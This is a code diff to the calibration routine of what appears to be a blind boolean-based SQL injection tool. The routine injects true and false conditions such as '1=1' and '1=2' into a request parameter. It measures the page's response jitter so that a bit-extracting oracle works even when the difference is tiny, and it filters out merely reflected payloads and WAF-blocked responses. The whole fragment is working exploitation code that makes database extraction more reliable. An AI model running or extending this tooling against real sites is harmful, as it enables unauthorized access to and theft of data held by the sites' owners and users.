@@ -160,18 +160,38 @@ def _sim(a, b):
 
 
 def calibrate(http, url, param, value, console=None):
-    """Find an injection context where TRUE and FALSE give different responses."""
+    """Find an injection context where TRUE and FALSE give different responses.
+
+    The tell can be tiny — one line ("Welcome" vs "Invalid") in a big page — so we
+    don't use a fixed similarity cutoff (a 0.95 floor missed those). Instead we
+    measure the page's own jitter with two identical TRUE requests and accept a
+    context only when FALSE sits reliably further from TRUE than that jitter. A
+    purely reflected payload (the `1=1`/`1=2` text echoed back) differs by a single
+    character, which stays under the margin, so it isn't mistaken for an oracle."""
     for context, tmpl in _CONTEXTS:
-        t = _inject(http, url, param, tmpl.format(v=value, c="1=1"))
+        t1 = _inject(http, url, param, tmpl.format(v=value, c="1=1"))
+        if not t1:
+            continue
         f = _inject(http, url, param, tmpl.format(v=value, c="1=2"))
-        if t and _sim(t, f) < 0.95:                 # the condition visibly moves the page
+        if not f:
+            continue
+        t2 = _inject(http, url, param, tmpl.format(v=value, c="1=1"))   # a second TRUE sample
+        noise = _sim(t1, t2) if t2 else 1.0          # how much identical requests vary
+        signal = _sim(t1, f)                         # how far FALSE sits from TRUE
+        margin = max(0.0008, 3.0 * (1.0 - noise))    # must beat the page's own jitter
+        if noise - signal > margin:
             # Threshold between the two pages: a response far below it on *both* is
             # neither — an error/WAF block, not a clean answer (used for anomaly
             # detection in ask, never for the bit decision).
-            threshold = min(0.95, (1.0 + _sim(t, f)) / 2)
-            o = Oracle(http, url, param, value, tmpl, context, t, f,
+            threshold = min(0.95, (1.0 + signal) / 2)
+            o = Oracle(http, url, param, value, tmpl, context, t1, f,
                        threshold=threshold, console=console)
-            if o.ask("1=1") and not o.ask("1=2"):   # confirm the oracle is consistent
+            # Confirm with two textually-distinct true/false pairs. A real oracle
+            # answers by *meaning*, so both true forms land on the TRUE page; a page
+            # that merely reflects the payload text would not, so this rejects a
+            # reflected `1=1`/`1=2` masquerading as an oracle.
+            if (o.ask("1=1") and not o.ask("1=2")
+                    and o.ask("'q'='q'") and not o.ask("'q'='r'")):
                 o.blocked = 0                        # calibration probes don't count
                 return o
     return None
